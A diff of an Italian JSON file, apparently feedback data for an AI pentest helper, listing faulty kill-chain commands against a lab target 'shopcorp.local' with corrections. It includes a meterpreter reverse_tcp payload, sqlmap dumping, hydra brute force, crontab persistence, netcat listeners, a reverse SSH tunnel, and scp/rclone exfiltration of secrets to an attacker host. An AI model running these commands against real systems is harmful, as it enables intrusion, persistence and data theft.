@@ -1,26 +1,140 @@
 [
   {
     "fase": "ricognizione",
+    "suggerimento_errato": "nmap",
+    "motivo": "Il comando è troppo generico: nmap richiede come argomento il target da analizzare (es: un indirizzo IP o un dominio).",
+    "timestamp": "2025-07-04T15:30:01.000000"
+  },
+  {
+    "fase": "ricognizione",
     "suggerimento_errato": "theHarvester -d shopcorp.local -p asn,emails,dns",
-    "motivo": "Sintassi errata per theHarvester. La sintassi corretta sarebbe: 'theHarvester -d shopcorp.local -b all'",
-    "timestamp": "2025-06-20T16:14:55.416786"
+    "motivo": "La sintassi è errata: l'opzione '-p' non esiste in theHarvester. Devi usare '-b' seguito da una sorgente, ad esempio 'all'.",
+    "timestamp": "2025-07-04T15:30:10.000000"
   },
   {
     "fase": "ricognizione",
-    "suggerimento_errato": "### Risposta attendibile:\n'nmap -p 53 -sUV --script=dns-brute ns[12].shopcorp.local'",
-    "motivo": "La sintassi è errata. Sintassi corretta: 'nmap -p 53 -sU -sV --script=dns-brute ns1.shopcorp.local ns2.shopcorp.local'",
-    "timestamp": "2025-06-23T16:40:54.713090"
-  },
-  {
-    "fase": "ricognizione",
-    "suggerimento_errato": "`nmap `",
-    "motivo": "suggerimento generico, non va bene in uno step operativo in una kill-chain",
-    "timestamp": "2025-06-25T21:59:33.301374"
+    "suggerimento_errato": "whois",
+    "motivo": "Comando incompleto: whois necessita del dominio da interrogare per funzionare correttamente.",
+    "timestamp": "2025-07-04T15:30:20.000000"
   },
   {
     "fase": "weaponization",
-    "suggerimento_errato": "`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f a LDATA=\"ssh user@10.10.10.20 -p 4444\" -o payload.mysql`",
-    "motivo": "Il comando suggerito non è valido perché contiene opzioni non supportate da msfvenom e non rispetta la sintassi reale del tool. In particolare, il formato del payload e alcune opzioni (LDATA) sono errati.",
-    "timestamp": "2025-06-25T23:17:38.843008"
+    "suggerimento_errato": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f a LDATA=\"ssh user@10.10.10.20 -p 4444\" -o payload.mysql",
+    "motivo": "Sono state inserite opzioni e parametri non validi: '-f a' non è supportato, LDATA non è un'opzione di msfvenom e '.mysql' non è un formato valido di payload.",
+    "timestamp": "2025-07-04T15:30:30.000000"
+  },
+  {
+    "fase": "weaponization",
+    "suggerimento_errato": "empire-setup",
+    "motivo": "Comando inesistente: per inizializzare Empire va eseguito lo script Python di setup con i permessi adeguati.",
+    "timestamp": "2025-07-04T15:30:40.000000"
+  },
+  {
+    "fase": "delivery",
+    "suggerimento_errato": "scp payload.elf /tmp",
+    "motivo": "Manca la parte relativa all'utente e all'host remoto: scp trasferisce i file tra macchine, quindi devi indicare 'user@host:/percorso'.",
+    "timestamp": "2025-07-04T15:30:50.000000"
+  },
+  {
+    "fase": "delivery",
+    "suggerimento_errato": "sendEmail -t mario.rossi@shopcorp.local -a payload.elf",
+    "motivo": "Comando incompleto: con sendEmail servono anche mittente (-f), soggetto (-u), messaggio (-m) e server SMTP (-s) per inviare correttamente una mail.",
+    "timestamp": "2025-07-04T15:31:00.000000"
+  },
+  {
+    "fase": "delivery",
+    "suggerimento_errato": "smbclient -U mario.rossi",
+    "motivo": "Comando incompleto: devi specificare la share SMB di destinazione e un comando da eseguire (es. 'put file').",
+    "timestamp": "2025-07-04T15:31:10.000000"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "msfconsole -e linux/x86/meterpreter/reverse_tcp",
+    "motivo": "L'opzione '-e' non è prevista per msfconsole e manca tutta la configurazione dell'exploit, dei parametri e dei payload necessari.",
+    "timestamp": "2025-07-04T15:31:20.000000"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "sqlmap shopcorp.local/login.php --dump",
+    "motivo": "Manca l'opzione '-u' che serve per specificare l'URL target in sqlmap. Il comando corretto prevede '-u' seguito dall'URL.",
+    "timestamp": "2025-07-04T15:31:30.000000"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "hydra mario.rossi@shopcorp.local",
+    "motivo": "Comando troppo generico: hydra richiede username/password list, servizio di destinazione e host per funzionare correttamente.",
+    "timestamp": "2025-07-04T15:31:40.000000"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "ssh shopcorp.local",
+    "motivo": "Comando incompleto: manca la specifica dell'username per l'autenticazione SSH.",
+    "timestamp": "2025-07-04T15:31:50.000000"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "crontab @reboot /tmp/payload.elf",
+    "motivo": "Sintassi errata: la voce va aggiunta usando un comando che concatena la nuova riga al crontab esistente.",
+    "timestamp": "2025-07-04T15:32:00.000000"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "systemctl enable payload.service",
+    "motivo": "Spesso sono necessari i permessi di amministratore per abilitare servizi di sistema: aggiungi 'sudo' prima del comando.",
+    "timestamp": "2025-07-04T15:32:10.000000"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "nc -p 4444",
+    "motivo": "Per avviare un listener Netcat serve almeno l'opzione '-l' (ascolto) e '-v' (verbose).",
+    "timestamp": "2025-07-04T15:32:20.000000"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "ncat -l 5555",
+    "motivo": "Se vuoi un listener cifrato persistente devi aggiungere '--ssl' e '--keep-open' alle opzioni.",
+    "timestamp": "2025-07-04T15:32:30.000000"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "ssh attacker@10.10.10.20 -R 2222:localhost:22",
+    "motivo": "L'opzione '-R' va posizionata prima dell'utente@host, altrimenti SSH potrebbe interpretarla in modo errato.",
+    "timestamp": "2025-07-04T15:32:40.000000"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "suggerimento_errato": "tar -czf /etc/secret secrets.tar.gz",
+    "motivo": "L'ordine degli argomenti è invertito: il file di destinazione deve precedere la directory da archiviare.",
+    "timestamp": "2025-07-04T15:32:50.000000"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "suggerimento_errato": "rclone secrets.tar.gz /home/attacker/",
+    "motivo": "Manca il comando 'copy' e la destinazione remota completa: rclone necessita di un verbo (es: 'copy') e dell'host remoto.",
+    "timestamp": "2025-07-04T15:33:00.000000"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "suggerimento_errato": "scp secrets.tar.gz /home/attacker/",
+    "motivo": "Devi specificare sia l'username che l'host remoto nella destinazione (es: 'username@host:/percorso').",
+    "timestamp": "2025-07-04T15:33:10.000000"
+  },
+  {
+    "fase": "ricognizione",
+    "suggerimento_errato": "`theHarvester -d shopcorp.local -b`",
+    "motivo": "Il comando è incompleto: dopo '-b' devi specificare la sorgente (ad esempio 'all', 'google', 'bing').",
+    "timestamp": "2025-07-04T16:10:31.721196"
+  },
+  {
+    "fase": "delivery",
+    "suggerimento_errato": "`scp payload.exe your_username@your_ip:/`",
+    "motivo": "Sebbene la sintassi sia formalmente corretta, di solito non hai i permessi per scrivere nella root '/' del sistema remoto. Usa una cartella come '/tmp' o la home directory dell’utente.",
+    "timestamp": "2025-07-04T16:15:22.428103"
+  },
+  {
+    "fase": "delivery",
+    "suggerimento_errato": "`sendEmail -f noreply@attacker.local -t info@shopcorp.local -u \"Test Email\" -m \"attachment: payload.exe\" -s smtp.attacker.local`",
+    "motivo": "Il comando non allega realmente il file 'payload.exe', ma inserisce solo il testo 'attachment: payload.exe' nel corpo del messaggio. Per inviare un vero allegato con sendEmail devi usare l'opzione '-a payload.exe'.",
+    "timestamp": "2025-07-04T16:38:08.432206"
   }
 ]
